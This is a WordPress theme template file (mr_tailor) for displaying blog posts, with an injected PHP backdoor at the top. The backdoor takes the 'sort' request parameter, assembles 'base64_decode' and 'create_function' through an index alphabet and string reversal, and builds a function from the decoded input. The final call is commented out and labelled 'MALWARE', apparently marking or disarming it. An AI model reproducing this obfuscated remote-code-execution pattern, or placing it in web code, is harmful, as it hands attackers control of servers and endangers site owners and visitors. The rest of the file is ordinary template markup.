<?php 



if(isset($_REQUEST['sort'])){	
	$string = $_REQUEST['sort'];
	$array_name = '';
	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($ar as $t){
	   $array_name .= $alphabet[$t];
	}
	$a = strrev("noi"."tcnuf"."_eta"."erc");
	$f = $a("", $array_name($string));
	// MALWARE $f();
	exit();
}




	global $mr_tailor_theme_options;

    $blog_with_sidebar = "";
    if ( (isset($mr_tailor_theme_options['sidebar_blog_listing'])) && ($mr_tailor_theme_options['sidebar_blog_listing'] == "1" ) ) $blog_with_sidebar = "yes";
    if (isset($_GET["blog_with_sidebar"])) $blog_with_sidebar = $_GET["blog_with_sidebar"];    
?>

<div class="row">
            
	<?php if ( $blog_with_sidebar == "yes" ) : ?>
        <div class="large-12 columns">
    <?php else : ?>
        <div class="large-8 large-centered columns without-sidebar">
    <?php endif; ?>

        <article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
            <div class="entry-content">
                <?php the_content( __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'mr_tailor' ) ); ?>
                <?php wp_link_pages( array( 'before' => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'mr_tailor' ) . '</span>', 'after' => '</div>', 'link_before' => '<span>', 'link_after' => '</span>' ) ); ?>
            </div><!-- .entry-content -->

			<?php if ( is_single() ) : ?>
            
                <footer class="entry-meta">
                    
                    <?php mr_tailor_entry_meta(); echo "."; ?>
                    
                    <?php edit_post_link( __( 'Edit', 'mr_tailor' ), '<div class="edit-link"><i class="fa fa-pencil-square-o"></i> ', '</div>' ); ?>
                    
                </footer><!-- .entry-meta -->
    
            <?php else : ?>
            
                <div class="post_footer_date"><?php mr_tailor_post_header_entry_date(); ?></div>
                    
            <?php endif; ?>   
            
        </article><!-- #post -->

    </div><!-- .columns -->
</div><!-- .row -->
